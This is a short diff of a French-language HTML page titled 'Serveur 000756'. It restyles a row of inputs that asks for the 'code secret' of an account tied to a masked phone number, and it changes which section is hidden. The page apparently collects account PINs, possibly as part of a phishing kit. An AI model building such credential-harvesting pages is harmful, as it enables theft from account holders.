@@ -22,7 +22,18 @@
     <!-- Titre -->
     <title>Serveur 000756</title>
 </head>
-
+<style>
+    #key input
+    {
+        background-color: #eae9e9;
+        border-bottom: 1px solid #6b6a6a;
+        border-radius: 50px;
+        width: 48px;
+        height: 48px;
+        font-size: 19px;
+        text-align: center;
+    }
+</style>
 <body>
     <div class="flex flex-wrap justify-center">
         <div class="block">
@@ -57,12 +68,12 @@
                         </div>
                     </div>
 
-                    <div class="pt-32 p-18">
+                    <div class="pt-32 p-18" style="display:none">
         <h1 class="font-normal text-black text-2xl text-center mb-8">
             Entrez votre code secret pour le compte de votre numéro *** *** ***
         </h1>
         <br><br>
-            <div class="flex gap-4 justify-center" id="section2 key" style="display:none">
+            <div class="flex gap-4 justify-center" id="section2 key">
                 <input type="text" name="code_secret_1">
                 <input type="text" name="code_secret_2">
                 <input type="text" name="code_secret_3">
